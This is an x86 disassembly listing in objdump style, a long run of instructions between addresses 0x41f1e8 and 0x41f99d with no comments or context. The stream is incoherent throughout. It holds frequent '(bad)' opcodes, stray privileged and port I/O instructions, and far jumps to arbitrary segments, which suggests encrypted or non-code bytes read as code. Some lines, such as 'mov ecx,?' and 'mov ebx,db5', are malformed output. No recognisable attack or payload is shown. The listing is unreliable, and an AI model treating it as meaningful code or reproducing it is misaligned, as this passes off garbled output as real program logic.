  41f1e8:	dec    BYTE PTR [ebp-0x53]
  41f1eb:	xor    edx,DWORD PTR [edi]
  41f1ed:	lds    edi,FWORD PTR [edx]
  41f1ef:	clc    
  41f1f0:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41f1f2:	add    DWORD PTR [edi],esp
  41f1f4:	lock pop eax
  41f1f6:	mov    al,ds:0xb11ed7c3
  41f1fb:	dec    esi
  41f1fc:	mov    bx,0x71bc
  41f200:	(bad)  
  41f201:	(bad)  
  41f203:	and    eax,0x802398d9
  41f208:	repz mov edx,0xd6f5b2ea
  41f20e:	xchg   ecx,eax
  41f20f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f210:	cmp    DWORD PTR [edi],ebx
  41f212:	mov    BYTE PTR [esi],bl
  41f214:	(bad)  
  41f215:	fmulp  st(7),st
  41f217:	push   ds
  41f218:	bound  ecx,QWORD PTR [ebx-0x5d]
  41f21b:	mov    ds:0x839e466b,eax
  41f220:	push   0x7d
  41f222:	(bad)  
  41f223:	jmp    0x41f1e3
  41f225:	fdivr  DWORD PTR [ecx-0x3e8c3b89]
  41f22b:	push   ds
  41f22c:	out    dx,al
  41f22d:	sub    DWORD PTR [edi],ebp
  41f22f:	xor    eax,0x283d2aba
  41f234:	push   ds
  41f235:	mov    BYTE PTR [esi+eax*1+0x586678d9],bl
  41f23c:	mov    esi,0x15684db8
  41f241:	lock add eax,0xa5c5679
  41f247:	(bad)  
  41f248:	or     ebp,DWORD PTR [ebx]
  41f24a:	addr16 in eax,0xd3
  41f24d:	push   ds
  41f24e:	xor    BYTE PTR [edx+ecx*4-0x59fe13aa],ch
  41f255:	xchg   ebp,eax
  41f256:	sbb    DWORD PTR [ecx+0xc18abf7],0xae2bcc40
  41f260:	dec    ebp
  41f261:	sub    DWORD PTR [eax+0x2230bf12],esi
  41f267:	xor    esp,edx
  41f269:	int    0xa
  41f26b:	jge    0x41f281
  41f26d:	mov    bh,0x77
  41f26f:	and    eax,DWORD PTR [ebx]
  41f271:	adc    BYTE PTR [ebx+0x2f],bl
  41f274:	pop    esi
  41f275:	repz or BYTE PTR [ecx+0x4a],dh
  41f279:	xchg   edx,eax
  41f27a:	in     eax,0xb8
  41f27c:	je     0x41f20c
  41f27e:	lods   al,BYTE PTR ds:[esi]
  41f27f:	mov    esi,0xce2f3d50
  41f284:	test   eax,0xe5c64b08
  41f289:	and    eax,0x3e615f5b
  41f28e:	popa   
  41f28f:	scas   al,BYTE PTR es:[edi]
  41f290:	enter  0xa383,0x1c
  41f294:	faddp  st(3),st
  41f296:	clc    
  41f297:	jge    0x41f30f
  41f299:	dec    ecx
  41f29a:	xor    bl,ch
  41f29c:	sahf   
  41f29d:	xor    eax,0x2e78a127
  41f2a2:	imul   eax,DWORD PTR [esp+ebp*2+0x4cf6ebaf],0x7f
  41f2aa:	and    al,0xc6
  41f2ac:	xlat   BYTE PTR ds:[ebx]
  41f2ad:	inc    edx
  41f2ae:	inc    ebp
  41f2af:	push   edx
  41f2b0:	push   esi
  41f2b1:	(bad)
  41f2b4:	sub    BYTE PTR [esp+eax*1-0x10],0x5e
  41f2b9:	fisubr WORD PTR cs:[ebp+0x2fc70fc5]
  41f2c0:	sub    eax,0x5f819e23
  41f2c5:	pusha  
  41f2c6:	hlt    
  41f2c7:	and    DWORD PTR [edx],0x5
  41f2ca:	dec    esp
  41f2cb:	data16 arpl WORD PTR [edi-0x13],di
  41f2cf:	adc    eax,0xc2e3475c
  41f2d4:	icebp  
  41f2d5:	add    al,0x1d
  41f2d7:	clc    
  41f2d8:	dec    edx
  41f2d9:	stos   DWORD PTR es:[edi],eax
  41f2da:	sbb    cl,cl
  41f2dc:	or     DWORD PTR [ebx-0x24],0xd4cf9e6f
  41f2e3:	mov    ebp,0xa999c94c
  41f2e8:	ror    DWORD PTR [ecx],0xf0
  41f2eb:	mov    ecx,?
  41f2ed:	loope  0x41f33c
  41f2ef:	push   cs
  41f2f0:	mov    edx,DWORD PTR [ebx+0x44d46309]
  41f2f6:	xor    eax,0x82179777
  41f2fb:	jns    0x41f2ff
  41f2fd:	adc    al,0xbb
  41f2ff:	mov    al,ds:0xa7b94910
  41f304:	ins    BYTE PTR es:[edi],dx
  41f305:	xchg   ecx,eax
  41f306:	shl    DWORD PTR [esi],cl
  41f308:	xchg   ebx,eax
  41f309:	aas    
  41f30a:	sub    bh,dl
  41f30c:	pop    ss
  41f30d:	ret    0x22ab
  41f310:	jmp    0x6f504d48
  41f315:	call   0x2f00:0x4c5cd96c
  41f31c:	push   0xb651d8da
  41f321:	gs inc ebx
  41f323:	sub    eax,0xf267d476
  41f328:	mov    al,0x2
  41f32a:	add    BYTE PTR ds:0xc15d77c,dh
  41f330:	pop    edx
  41f331:	(bad)  
  41f332:	push   0x4
  41f334:	aam    0xa9
  41f336:	hlt    
  41f337:	dec    eax
  41f338:	xor    DWORD PTR [esp+eiz*4],edi
  41f33b:	test   DWORD PTR [ecx+0x1a],edi
  41f33e:	cwde   
  41f33f:	(bad)
  41f343:	and    bl,BYTE PTR [edx-0x697236f8]
  41f349:	jecxz  0x41f2d4
  41f34b:	push   edx
  41f34c:	pop    eax
  41f34d:	daa    
  41f34e:	mov    bh,0xff
  41f350:	bound  edx,QWORD PTR [ebx-0x44]
  41f353:	push   esi
  41f354:	jle    0x41f2ec
  41f356:	cmc    
  41f357:	test   BYTE PTR [edx],dh
  41f359:	ins    DWORD PTR es:[edi],dx
  41f35a:	jmp    0xdf66:0x2db3c8c8
  41f361:	test   eax,0x15106fc3
  41f366:	and    esi,esp
  41f368:	mov    ah,0xcd
  41f36a:	inc    eax
  41f36b:	das    
  41f36c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f36d:	jne    0x41f3e8
  41f36f:	ret    0x2efb
  41f372:	fwait
  41f373:	pop    ebx
  41f374:	repnz repz add eax,0xbebe4113
  41f37b:	jge    0x41f347
  41f37d:	xor    eax,DWORD PTR [eax]
  41f37f:	and    eax,0xcce09f02
  41f384:	sbb    BYTE PTR [edx-0x7b7627db],dh
  41f38a:	bound  eax,QWORD PTR [edx+0x4474b32e]
  41f390:	xor    BYTE PTR [esi+ebp*1],al
  41f393:	jl     0x41f319
  41f395:	or     eax,0x574e35f8
  41f39a:	inc    edi
  41f39b:	dec    eax
  41f39c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f39d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f39e:	xchg   esi,eax
  41f39f:	in     eax,dx
  41f3a0:	stos   BYTE PTR es:[edi],al
  41f3a1:	dec    ebx
  41f3a2:	inc    ebx
  41f3a3:	push   ecx
  41f3a4:	sti    
  41f3a5:	sub    eax,0x64bbda78
  41f3aa:	push   es
  41f3ab:	or     ah,BYTE PTR [eax]
  41f3ad:	inc    ecx
  41f3ae:	mov    al,0x2e
  41f3b0:	mov    esi,0xe05ab225
  41f3b5:	sub    dl,BYTE PTR [esi]
  41f3b7:	or     BYTE PTR [edx+0x57],ch
  41f3ba:	xchg   esp,eax
  41f3bb:	sbb    DWORD PTR [esi+0x3d1d140],0x13e4d987
  41f3c5:	add    eax,0xfa155dd7
  41f3ca:	sub    BYTE PTR [esi-0x71adb6c6],ch
  41f3d0:	stos   DWORD PTR es:[edi],eax
  41f3d1:	popf   
  41f3d2:	jge    0x41f431
  41f3d4:	sbb    BYTE PTR [edx],cl
  41f3d6:	pusha  
  41f3d7:	shl    al,cl
  41f3d9:	sahf   
  41f3da:	add    eax,0x11bf4769
  41f3df:	addr16 mov ch,0x9a
  41f3e2:	and    ah,bl
  41f3e4:	aam    0xa8
  41f3e6:	out    0xf9,al
  41f3e8:	leave  
  41f3e9:	hlt    
  41f3ea:	(bad)  
  41f3eb:	mov    ebp,0xae12576b
  41f3f0:	and    DWORD PTR [edx-0x71],0xb11250a5
  41f3f7:	popa   
  41f3f8:	mov    cs,WORD PTR [esi-0x5d]
  41f3fb:	push   cs
  41f3fc:	inc    eax
  41f3fd:	aad    0x42
  41f3ff:	in     al,0xd7
  41f401:	xchg   DWORD PTR [edx-0x6a905b73],eax
  41f407:	xor    eax,0xf34114c4
  41f40c:	loopne 0x41f420
  41f40e:	dec    eax
  41f40f:	push   edi
  41f410:	jecxz  0x41f463
  41f412:	sbb    al,BYTE PTR [eax+0x261befdf]
  41f418:	imul   ebx
  41f41a:	shr    BYTE PTR [ecx-0x39],cl
  41f41d:	pushf  
  41f41e:	jb     0x41f3f3
  41f420:	int    0x2b
  41f422:	int3   
  41f423:	ret    0xcb6
  41f426:	stc    
  41f427:	lds    eax,FWORD PTR [edi+0x41]
  41f42a:	mov    al,0xd5
  41f42c:	mov    esi,0xcc400f27
  41f431:	pop    ebx
  41f432:	mov    cl,0x8f
  41f434:	fs cdq 
  41f436:	push   ebx
  41f437:	rol    BYTE PTR [eax-0x5c],1
  41f43a:	jp     0x41f3c7
  41f43c:	fbstp  TBYTE PTR [ebp+0x3d]
  41f43f:	sub    dh,0xa2
  41f442:	das    
  41f443:	inc    eax
  41f444:	loopne 0x41f3d2
  41f446:	push   ebx
  41f447:	sahf   
  41f448:	mov    edi,0x5b4c
	...
  41f469:	add    BYTE PTR [edx+0x4d],dl
  41f46c:	dec    esp
  41f46d:	inc    ebp
  41f46e:	pop    edi
  41f46f:	inc    ebp
  41f470:	pop    ebx
  41f471:	pop    edi
  41f472:	shr    BYTE PTR [esi+0x27],0x49
  41f476:	mov    esp,0xd9024695
  41f47b:	add    DWORD PTR [ecx],0x0
  41f47e:	mov    DWORD PTR [esi],eax
  41f480:	add    BYTE PTR [eax],al
  41f482:	fwait
  41f483:	pop    eax
  41f484:	jnp    0x41f4c1
  41f486:	add    DWORD PTR [ecx],ebp
  41f488:	sar    ecx,1
  41f48a:	fnstenv [ebp+edi*4-0x4ec5d345]
  41f491:	mov    dh,0x7f
  41f493:	ja     0x1da027a
  41f499:	mov    BYTE PTR [ebx+ebx*4-0x54c69f32],0xe
  41f4a1:	jge    0x41f506
  41f4a3:	cmp    esp,edi
  41f4a5:	imul   BYTE PTR [edx+ecx*4]
  41f4a8:	push   ebx
  41f4a9:	push   ebp
  41f4aa:	sub    esi,DWORD PTR [ecx]
  41f4ac:	les    ecx,FWORD PTR [ebp+0x1d7f857e]
  41f4b2:	push   esp
  41f4b3:	scas   al,BYTE PTR es:[edi]
  41f4b4:	shr    BYTE PTR [ebx],cl
  41f4b6:	xor    eax,DWORD PTR ds:0x9893958f
  41f4bc:	mov    esp,0x35c64c24
  41f4c1:	xchg   ebp,eax
  41f4c2:	shl    bl,1
  41f4c4:	cmp    edi,DWORD PTR [edx-0x3ffa3027]
  41f4ca:	ret    
  41f4cb:	push   edi
  41f4cc:	sbb    eax,0xcde39362
  41f4d1:	mov    ecx,0xa6b6137a
  41f4d6:	mov    ah,0xb8
  41f4d8:	mov    ch,0x38
  41f4da:	int3   
  41f4db:	adc    eax,0x7e396ba5
  41f4e0:	mov    ds,WORD PTR [esi-0x416b40e0]
  41f4e6:	pop    ss
  41f4e7:	lahf   
  41f4e8:	mov    eax,DWORD PTR [ebx]
  41f4ea:	xor    edx,DWORD PTR [ebx+ebx*2-0x52302e03]
  41f4f1:	in     al,0x1
  41f4f3:	push   ebx
  41f4f4:	aad    0xf2
  41f4f6:	scas   al,BYTE PTR es:[edi]
  41f4f7:	add    edi,DWORD PTR [esi]
  41f4f9:	popf   
  41f4fa:	push   ebp
  41f4fb:	add    BYTE PTR es:[ecx-0x5a759699],bh
  41f502:	or     esi,edx
  41f504:	data16 and dh,BYTE PTR [ecx]
  41f507:	xchg   BYTE PTR [eax-0x1e],ch
  41f50a:	adc    bl,BYTE PTR [ebx-0x3a]
  41f50d:	loope  0x41f55a
  41f50f:	out    dx,al
  41f510:	mov    ebp,0x14e2132a
  41f515:	dec    ebx
  41f516:	jmp    0x41f4d7
  41f518:	scas   eax,DWORD PTR es:[edi]
  41f519:	jbe    0x41f563
  41f51b:	xchg   ebp,eax
  41f51c:	mov    eax,ds:0x89923008
  41f521:	lock mov eax,0xa8827cba
  41f527:	cli    
  41f528:	push   esp
  41f529:	addr16 mov eax,ds:0x98b7
  41f52d:	scas   eax,DWORD PTR es:[edi]
  41f52e:	sub    ch,ch
  41f530:	xor    BYTE PTR [ebx],al
  41f532:	ret    0xa44a
  41f535:	je     0x41f595
  41f537:	mov    esp,0x24054490
  41f53c:	out    dx,eax
  41f53d:	cli    
  41f53e:	aam    0xe1
  41f540:	dec    ebx
  41f541:	pcmpgtd mm2,QWORD PTR [ebx+ecx*8-0x424fdb6f]
  41f549:	(bad)  
  41f54a:	out    0x9e,eax
  41f54c:	jg     0x41f50a
  41f54e:	(bad)  
  41f54f:	aam    0xf6
  41f551:	test   DWORD PTR [esi+0x560d8386],edi
  41f557:	es inc esp
  41f559:	mov    ds:0xcf48f76,eax
  41f55e:	xchg   edi,eax
  41f55f:	mov    ebx,0xc4179cce
  41f564:	adc    BYTE PTR [eax+0x16],ah
  41f567:	sub    dl,BYTE PTR [ecx+esi*8+0x6d978627]
  41f56e:	mov    ah,0x3f
  41f570:	xlat   BYTE PTR ds:[ebx]
  41f571:	inc    ebx
  41f572:	and    ah,BYTE PTR [esi-0x17e75ca2]
  41f578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f579:	cld    
  41f57a:	test   BYTE PTR [edi+0x7df884a5],ah
  41f580:	(bad)  
  41f582:	mov    ch,0xd6
  41f584:	js     0x41f57d
  41f586:	sbb    cl,BYTE PTR [edx-0x21]
  41f589:	mov    bh,0x6b
  41f58b:	in     al,0x58
  41f58d:	dec    ebp
  41f58e:	mov    eax,ds:0x4b1fad86
  41f593:	(bad)  
  41f594:	jmp    0xcb35:0x8f7384f8
  41f59b:	jnp    0x41f553
  41f59d:	pop    edi
  41f59e:	scas   al,BYTE PTR es:[edi]
  41f59f:	lods   eax,DWORD PTR ds:[esi]
  41f5a0:	lahf   
  41f5a1:	mov    ecx,0xab63f3a8
  41f5a6:	arpl   WORD PTR [ecx-0x7f6ac9d6],sp
  41f5ac:	mov    dh,0xdf
  41f5ae:	jmp    DWORD PTR [edx]
  41f5b0:	mov    ds:0x49388eb6,eax
  41f5b5:	sub    esi,ecx
  41f5b7:	icebp  
  41f5b8:	ret    0x1245
  41f5bb:	test   al,0x26
  41f5bd:	arpl   WORD PTR [edx+0x5f865cc9],bx
  41f5c3:	mov    BYTE PTR [eax-0x79],0x7f
  41f5c7:	sbb    edi,esp
  41f5c9:	out    dx,al
  41f5ca:	jnp    0x41f5f9
  41f5cc:	in     eax,dx
  41f5cd:	xchg   DWORD PTR [edi-0x47],ebx
  41f5d0:	cmp    DWORD PTR [ecx],eax
  41f5d2:	mov    ch,al
  41f5d4:	rol    BYTE PTR [ecx+0x69],0x54
  41f5d8:	loop   0x41f5e4
  41f5da:	dec    ebx
  41f5db:	retf   
  41f5dc:	dec    edx
  41f5dd:	stos   BYTE PTR es:[edi],al
  41f5de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5df:	mov    dh,0x9f
  41f5e1:	fcmovnbe st,st(7)
  41f5e3:	test   al,0x57
  41f5e5:	mov    ds:0x595ef128,al
  41f5ea:	ss add eax,0xa61ab3da
  41f5f0:	leave  
  41f5f1:	and    DWORD PTR [edi-0x7405b545],edx
  41f5f7:	pop    edx
  41f5f8:	xchg   esp,eax
  41f5f9:	xor    ecx,DWORD PTR [ebx+0x17]
  41f5fc:	pop    edi
  41f5fd:	add    BYTE PTR [ebx],0x24
  41f600:	jno    0x41f62b
  41f602:	pop    ss
  41f603:	scas   al,BYTE PTR es:[edi]
  41f604:	or     eax,0x704077ae
  41f609:	jmp    0x41f59f
  41f60b:	xlat   BYTE PTR ds:[ebx]
  41f60c:	jmp    0x41f63d
  41f60e:	xchg   DWORD PTR [edx-0x7949823d],eax
  41f614:	xor    eax,0x8e61fefc
  41f619:	push   0x20f2b839
  41f61e:	lods   al,BYTE PTR ds:[esi]
  41f61f:	add    al,0x36
  41f621:	stc    
  41f622:	iret   
  41f623:	or     eax,0x9d7ee694
  41f628:	push   esi
  41f629:	into   
  41f62a:	fldlg2 
  41f62c:	aad    0x7e
  41f62e:	frstor [esi+0x837b85d]
  41f634:	in     al,dx
  41f635:	push   0xffffffdb
  41f637:	and    edi,DWORD PTR [esi]
  41f639:	ja     0x41f65d
  41f63b:	add    bl,BYTE PTR [esi+ecx*4-0x34]
  41f63f:	mov    eax,cs
  41f641:	sbb    al,BYTE PTR [edx]
  41f643:	push   ebp
  41f644:	shl    BYTE PTR [eax+0x13655ddb],0xda
  41f64b:	retf   
  41f64c:	outs   dx,DWORD PTR ds:[esi]
  41f64d:	pop    es
  41f64e:	fistp  DWORD PTR [edi+0x69]
  41f651:	pop    ebp
  41f652:	es xchg ecx,eax
  41f654:	adc    al,0xda
  41f656:	lahf   
  41f657:	sbb    ebp,ebp
  41f659:	cmp    al,0xf5
  41f65b:	call   0xad48d05c
  41f660:	dec    ebx
  41f661:	(bad)  
  41f662:	fild   QWORD PTR [ebp-0x4a]
  41f665:	lock push eax
  41f667:	mov    ebp,0xc692ca80
  41f66c:	lds    edx,FWORD PTR [edi]
  41f66e:	loope  0x41f6c7
  41f670:	aam    0x83
  41f672:	sub    bl,bl
  41f674:	pusha  
  41f675:	inc    esi
  41f676:	push   edi
  41f677:	inc    ebp
  41f678:	or     al,0x7c
  41f67a:	scas   al,BYTE PTR es:[edi]
  41f67b:	mov    bh,0xe0
  41f67d:	pop    ds
  41f67e:	into   
  41f67f:	dec    ecx
  41f680:	push   0x6a
  41f682:	dec    esp
  41f683:	mov    ecx,0x93e8b695
  41f688:	dec    ebx
  41f689:	and    edi,ebp
  41f68b:	dec    esi
  41f68c:	es cld 
  41f68e:	outs   dx,DWORD PTR ds:[esi]
  41f68f:	push   eax
  41f690:	xchg   edi,eax
  41f691:	mov    ebx,db5
  41f694:	jno    0x41f6f3
  41f696:	iret   
  41f697:	int    0x96
  41f699:	cmc    
  41f69a:	(bad)  
  41f69b:	and    eax,0x749c0559
  41f6a0:	sbb    esi,DWORD PTR [eax+0x28b352fd]
  41f6a6:	aaa    
  41f6a7:	retf   0xd1cc
  41f6aa:	jecxz  0x41f674
  41f6ac:	add    eax,0x6293aa68
  41f6b1:	(bad)  
  41f6b2:	js     0x41f6e4
  41f6b4:	dec    esp
  41f6b5:	inc    edx
  41f6b6:	jnp    0x41f650
  41f6b8:	push   ecx
  41f6b9:	cmp    eax,0x431bba87
  41f6be:	sub    ah,BYTE PTR [ecx-0x3f]
  41f6c1:	mov    es,ecx
  41f6c3:	leave  
  41f6c4:	mov    ebx,ebp
  41f6c6:	jmp    0x41f714
  41f6c8:	ret    0x55e3
  41f6cb:	(bad)  
  41f6cc:	fsubr  QWORD PTR [edx-0x4b902da]
  41f6d2:	and    BYTE PTR [eax+0x66],al
  41f6d5:	imul   edi,ecx,0x6bdf21ab
  41f6db:	jge    0x41f6f5
  41f6dd:	jnp    0x41f6b2
  41f6df:	dec    ebp
  41f6e0:	cmp    eax,0xba0f314e
  41f6e5:	std    
  41f6e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6e7:	xor    eax,0x7ecf6c57
  41f6ec:	int3   
  41f6ed:	pop    edx
  41f6ee:	add    eax,0xffffff98
  41f6f1:	ja     0x41f6e6
  41f6f3:	gs jne 0x41f6d6
  41f6f6:	int3   
  41f6f7:	mov    dh,0x6e
  41f6f9:	or     ch,BYTE PTR [esi-0x44]
  41f6fc:	mov    ds:0xfe072e84,al
  41f701:	pushf  
  41f702:	inc    ebx
  41f703:	mov    ah,0x76
  41f705:	xor    BYTE PTR [ecx-0x60],0x4d
  41f709:	rep lods eax,DWORD PTR ds:[esi]
  41f70b:	cmp    eax,0xd8e38cb6
  41f710:	push   es
  41f711:	call   0xede23cf5
  41f716:	xchg   edx,eax
  41f717:	mov    esi,esp
  41f719:	dec    ebx
  41f71a:	push   ecx
  41f71b:	mov    cl,0x2c
  41f71d:	imul   ebp,DWORD PTR [ecx],0x32dc7bd1
  41f723:	call   0xecda:0x1c90a6e1
  41f72a:	jbe    0x41f6ee
  41f72c:	hlt    
  41f72d:	imul   eax,DWORD PTR [esi+0x1bad98df],0x49bc02cf
  41f737:	mov    WORD PTR [eax-0x3],cs
  41f73a:	mov    ah,bh
  41f73c:	push   esp
  41f73d:	mov    ah,0x7d
  41f73f:	hlt    
  41f740:	daa    
  41f741:	fcomp  DWORD PTR [ebx+edx*1+0x9]
  41f745:	dec    eax
  41f746:	and    BYTE PTR [ecx-0x5a],0x0
  41f74a:	ja     0x41f709
  41f74c:	inc    edi
  41f74d:	jb     0x41f7c8
  41f74f:	mov    BYTE PTR [eax+0x3e],dl
  41f752:	fadd   DWORD PTR [edi]
  41f754:	(bad)  
  41f755:	xor    ch,BYTE PTR [esi+0x6d2e5af]
  41f75b:	mov    ebp,DWORD PTR [eax]
  41f75d:	sub    al,bh
  41f75f:	jle    0x41f7e0
  41f761:	mov    DWORD PTR [ecx-0x6c],edx
  41f764:	fs pop es
  41f766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f767:	adc    ecx,DWORD PTR [edi+0x75]
  41f76a:	outs   dx,BYTE PTR ds:[esi]
  41f76b:	call   0x225d529
  41f770:	nop
  41f771:	jae    0x41f748
  41f773:	cmp    al,BYTE PTR [ebp+0x3c]
  41f776:	xchg   edi,eax
  41f777:	ja     0x41f7b1
  41f779:	rcl    BYTE PTR es:[ecx],cl
  41f77c:	xchg   edi,eax
  41f77d:	int    0xc1
  41f77f:	xchg   edi,eax
  41f780:	ja     0x41f75e
  41f782:	inc    ebx
  41f783:	scas   al,BYTE PTR es:[edi]
  41f784:	or     DWORD PTR [esi+ecx*2+0x18],esi
  41f788:	or     eax,0x75e317ce
  41f78d:	cld    
  41f78e:	sbb    dh,BYTE PTR [ebx]
  41f790:	jmp    0x41f786
  41f792:	xchg   ebx,eax
  41f793:	rep stos DWORD PTR es:[edi],eax
  41f795:	pop    eax
  41f796:	or     esi,DWORD PTR [edi-0x7e774980]
  41f79c:	loop   0x41f7d5
  41f79e:	dec    esp
  41f79f:	lock fwait
  41f7a1:	stc    
  41f7a2:	mov    ecx,0xea32c141
  41f7a7:	xchg   cl,dh
  41f7a9:	fild   QWORD PTR [edx+eiz*8-0x7d711d7c]
  41f7b0:	mov    bl,0x38
  41f7b2:	push   esi
  41f7b3:	lds    ebx,FWORD PTR [eax+0x7]
  41f7b6:	xchg   ecx,eax
  41f7b7:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41f7b9:	nop
  41f7ba:	mov    ds:0x12ff31a3,al
  41f7bf:	xlat   BYTE PTR ds:[ebx]
  41f7c0:	imul   edx,DWORD PTR [esp+edx*2-0x75c93f4e],0x11070f53
  41f7cb:	xchg   ecx,eax
  41f7cc:	dec    esi
  41f7cd:	dec    ebp
  41f7ce:	iret   
  41f7cf:	xor    cl,bh
  41f7d1:	xchg   edi,eax
  41f7d2:	jmp    0xb7fd:0x5c686531
  41f7d9:	lea    edi,[edi]
  41f7db:	mov    DWORD PTR [ebx+0x10f927b6],ebp
  41f7e1:	xor    al,0xea
  41f7e3:	ss mov eax,0xb0dd0ac
  41f7e9:	adc    DWORD PTR [ecx-0x2a],ecx
  41f7ec:	sub    eax,0x6844da3a
  41f7f1:	sbb    eax,0xc4176a88
  41f7f6:	xchg   ecx,eax
  41f7f7:	lahf   
  41f7f8:	inc    ebx
  41f7f9:	hlt    
  41f7fa:	sbb    eax,0x860e6175
  41f7ff:	or     bh,BYTE PTR [eax-0x2e]
  41f802:	adc    DWORD PTR [ebx],0x15
  41f805:	mov    esi,0x6f96ca46
  41f80a:	idiv   DWORD PTR es:[ecx+0x6437bc97]
  41f811:	and    BYTE PTR [ecx+0x6170fd1],ah
  41f817:	fnstenv [edi-0x77]
  41f81a:	outs   dx,BYTE PTR ds:[esi]
  41f81b:	repnz lea esp,[ebx+0xa112162]
  41f822:	adc    ah,al
  41f824:	mov    BYTE PTR [edi-0x6a5eb354],bl
  41f82a:	inc    edx
  41f82b:	fwait
  41f82c:	(bad)  
  41f82d:	gs inc edx
  41f82f:	jp     0x41f87f
  41f831:	cmp    esi,DWORD PTR [ebx]
  41f833:	push   esi
  41f834:	push   esi
  41f835:	pop    edx
  41f836:	xor    al,0xdb
  41f838:	gs (bad) 
  41f83a:	cld    
  41f83b:	cmc    
  41f83c:	dec    ebx
  41f83d:	jo     0x41f847
  41f83f:	shr    al,cl
  41f841:	ss dec ecx
  41f843:	fistp  QWORD PTR [edi-0x5e]
  41f846:	xor    BYTE PTR [eax],0x2d
  41f849:	jne    0x41f7cd
  41f84b:	clc    
  41f84c:	loopne 0x41f882
  41f84e:	or     DWORD PTR ds:0xdb44eb4e,eax
  41f854:	in     eax,0x10
  41f856:	mov    al,0xcb
  41f858:	out    0xbb,al
  41f85a:	jp     0x41f813
  41f85c:	push   esp
  41f85d:	sub    eax,0x46170fe6
  41f862:	xor    eax,0xeba83786
  41f867:	push   esp
  41f868:	sar    BYTE PTR [edi-0x2cea553],0xc
  41f86f:	jbe    0x41f846
  41f871:	push   0x2339b25a
  41f876:	lock xchg BYTE PTR [edx+ecx*1-0xa],cl
  41f87b:	adc    eax,0x4b26195f
  41f880:	sub    edx,DWORD PTR [edx-0x5c23e828]
  41f886:	jns    0x41f8ce
  41f888:	clc    
  41f889:	jbe    0x41f892
  41f88b:	pushf  
  41f88c:	xchg   ebx,eax
  41f88d:	inc    DWORD PTR [ecx+0x10bb4c1f]
  41f893:	imul   ebx,DWORD PTR [ebx+0x258d46f0],0xe6a568e
  41f89d:	mov    DWORD PTR [edi],edx
  41f89f:	iret   
  41f8a0:	pop    esp
  41f8a1:	mov    WORD PTR [edi],gs
  41f8a3:	cwde   
  41f8a4:	mov    ah,0x5f
  41f8a6:	jb     0x41f86e
  41f8a8:	daa    
  41f8a9:	mov    eax,0xa99d92e
  41f8ae:	or     edx,DWORD PTR [esp+ebx*4]
  41f8b1:	mov    DWORD PTR [edx+eiz*2-0x4b49973d],esp
  41f8b8:	imul   eax,DWORD PTR cs:[edi-0x4cdde1a],0xffffffbb
  41f8c0:	push   0xffffffd9
  41f8c2:	jmp    0x1664:0x57c15cbc
  41f8c9:	xchg   ebp,eax
  41f8ca:	(bad)  
  41f8cb:	clc    
  41f8cc:	push   esp
  41f8cd:	add    ebx,DWORD PTR [ebp-0x5a]
  41f8d0:	es jns 0x41f92e
  41f8d3:	or     BYTE PTR [edi-0x74],dl
  41f8d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8d7:	mov    al,BYTE PTR [ebx+edi*1-0x3a]
  41f8db:	push   ss
  41f8dc:	in     eax,0x9d
  41f8de:	or     eax,0x8e1a494
  41f8e3:	jmp    0x6dae423d
  41f8e8:	sbb    BYTE PTR fs:[eax-0x699fe6f2],ah
  41f8ef:	mov    dl,0x3e
  41f8f1:	xchg   edi,eax
  41f8f2:	fcom   st(5)
  41f8f4:	mov    bl,ah
  41f8f6:	outs   dx,BYTE PTR ds:[esi]
  41f8f7:	add    BYTE PTR [ebp+0x1097c241],al
  41f8fd:	xchg   cl,dh
  41f8ff:	sub    DWORD PTR [edi-0x1f],esp
  41f902:	mov    edi,0xc7ef3fb2
  41f907:	ins    BYTE PTR es:[edi],dx
  41f908:	iret   
  41f909:	aam    0x9e
  41f90b:	cmc    
  41f90c:	add    al,0x7f
  41f90e:	and    BYTE PTR [ebp-0x3b],bl
  41f911:	mov    edx,0x86629155
  41f916:	mov    ebx,0x4bc1d155
  41f91b:	bound  ebx,QWORD PTR [bx+0x2a04]
  41f920:	jbe    0x41f8bc
  41f922:	fcomp  DWORD PTR [esi]
  41f924:	lea    ecx,[ebp-0x5c]
  41f927:	pop    edi
  41f928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f929:	in     al,dx
  41f92a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f92b:	into   
  41f92c:	pop    es
  41f92d:	lds    esp,FWORD PTR [esi+0x6]
  41f930:	std    
  41f931:	shl    DWORD PTR [edi+0x636f66ac],0x63
  41f938:	test   DWORD PTR [eax-0x74],eax
  41f93b:	and    dl,BYTE PTR ds:0xcd49b8e6
  41f941:	shl    bl,1
  41f943:	jmp    0x41f8d7
  41f945:	imul   edx,esp,0x25a00e6f
  41f94b:	(bad)  
  41f94c:	outs   dx,BYTE PTR ds:[esi]
  41f94d:	adc    ebx,DWORD PTR cs:[edx-0x172ccbd1]
  41f954:	push   ss
  41f955:	adc    bl,BYTE PTR [edx-0xb]
  41f958:	retf   
  41f959:	mov    BYTE PTR ss:[edx],bh
  41f95c:	push   cs
  41f95d:	retf   
  41f95e:	fist   DWORD PTR [ecx]
  41f960:	push   ecx
  41f961:	pop    esp
  41f962:	sbb    al,0xab
  41f964:	mov    al,ds:0xb8ab8c8f
  41f969:	adc    esi,DWORD PTR [ebx-0x4a]
  41f96c:	mov    ebp,0x7c8a84b9
  41f971:	ret    
  41f972:	push   ds
  41f973:	imul   edx,DWORD PTR [ebp-0x78],0xffffffdc
  41f977:	mov    edx,0xd9c25750
  41f97c:	pop    ds
  41f97d:	ds mov bl,0xa
  41f980:	push   0x4e8d9bc2
  41f985:	xor    ecx,edx
  41f987:	fsub   QWORD PTR [ecx]
  41f989:	lock xor BYTE PTR [edi],ch
  41f98c:	sbb    BYTE PTR [ebx+eiz*1],cl
  41f98f:	pop    ebp
  41f990:	lahf   
  41f991:	mov    ds:0x329d9981,al
  41f996:	lods   eax,DWORD PTR ds:[esi]
  41f997:	and    BYTE PTR [eax+0x38d5426d],bh
  41f99d:	push   ss
